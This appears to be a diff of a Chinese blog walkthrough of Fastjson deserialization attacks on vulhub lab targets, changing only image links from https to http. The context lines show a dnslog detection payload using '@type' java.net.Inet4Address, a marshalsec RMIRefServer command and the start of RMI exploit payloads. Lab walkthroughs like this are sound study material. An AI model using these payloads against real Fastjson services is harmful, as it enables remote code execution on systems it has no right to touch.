@@ -48,19 +48,19 @@ Fastjson 在对 JSON 字符串进行反序列化的时候，会读取 @type 的�
 
 vulhub 环境搭建成功后，访问 http://youIp:8090
 
-![image-20230722001736698](https://pic.mewhz.com/blog/image-20230722001736698.png)
+![image-20230722001736698](http://pic.mewhz.com/blog/image-20230722001736698.png)
 
 使用 Burp Suite 抓包，并修改请求方式为 POST，尝试使用两种方式分别判断是否使用 Fastjson 库。
 
 1. 修改请求方式为 POST，并输入非法的 JSON 格式，判断是否报错：
 
-![image-20230722002332468](https://pic.mewhz.com/blog/image-20230722002332468.png)
+![image-20230722002332468](http://pic.mewhz.com/blog/image-20230722002332468.png)
 
 2. 使用 dnslog 探测：{"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}：
 
-![image-20230722005850015](https://pic.mewhz.com/blog/image-20230722005850015.png)
+![image-20230722005850015](http://pic.mewhz.com/blog/image-20230722005850015.png)
 
-![image-20230722005919707](https://pic.mewhz.com/blog/image-20230722005919707.png)
+![image-20230722005919707](http://pic.mewhz.com/blog/image-20230722005919707.png)
 
 两种方法分别判断出使用 Fastjson 库
 
@@ -159,7 +159,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 向靶场发送 payload，并带上 RMI 的地址：
 
-![image-20230722025051350](https://pic.mewhz.com/blog/image-20230722025051350.png)
+![image-20230722025051350](http://pic.mewhz.com/blog/image-20230722025051350.png)
 
 ```json
 {
@@ -187,13 +187,13 @@ cd /tmp
 # 切换到目录
 ```
 
-![image-20230722023644790](https://pic.mewhz.com/blog/image-20230722023644790.png)
+![image-20230722023644790](http://pic.mewhz.com/blog/image-20230722023644790.png)
 
 创建成功~
 
-![image-20230722023701480](https://pic.mewhz.com/blog/image-20230722023701480.png)
+![image-20230722023701480](http://pic.mewhz.com/blog/image-20230722023701480.png)
 
-![image-20230722023708803](https://pic.mewhz.com/blog/image-20230722023708803.png)
+![image-20230722023708803](http://pic.mewhz.com/blog/image-20230722023708803.png)
 
 web 服务和 RMI 服务均有反应~
 
@@ -239,15 +239,15 @@ vulhub 环境搭建成功后，访问 http://youIp:8090
 
 1. 修改请求方式为 POST，并输入非法的 JSON 格式，判断是否报错：
 
-![image-20230723010622595](https://pic.mewhz.com/blog/image-20230723010622595.png)
+![image-20230723010622595](http://pic.mewhz.com/blog/image-20230723010622595.png)
 
 2. 使用 dnslog 探测：{"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}：
 
-![image-20230723011036697](https://pic.mewhz.com/blog/image-20230723011036697.png)
+![image-20230723011036697](http://pic.mewhz.com/blog/image-20230723011036697.png)
 
 
 
-![image-20230723011024500](https://pic.mewhz.com/blog/image-20230723011024500.png)
+![image-20230723011024500](http://pic.mewhz.com/blog/image-20230723011024500.png)
 
 两种方法分别判断出使用 Fastjson 库
 
@@ -300,7 +300,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 向靶场服务器发送 payload：
 
-![image-20230723012333055](https://pic.mewhz.com/blog/image-20230723012333055.png)
+![image-20230723012333055](http://pic.mewhz.com/blog/image-20230723012333055.png)
 
 ```json
 {
@@ -321,13 +321,13 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 docker exec -it 93f /bin/bash
 ```
 
-![image-20230723013251365](https://pic.mewhz.com/blog/image-20230723013251365.png)
+![image-20230723013251365](http://pic.mewhz.com/blog/image-20230723013251365.png)
 
 创建成功~
 
-![image-20230722023701480](https://pic.mewhz.com/blog/image-20230722023701480.png)
+![image-20230722023701480](http://pic.mewhz.com/blog/image-20230722023701480.png)
 
-![image-20230722023708803](https://pic.mewhz.com/blog/image-20230722023708803.png)
+![image-20230722023708803](http://pic.mewhz.com/blog/image-20230722023708803.png)
 
 web 服务和 RMI 服务均有反应~
 
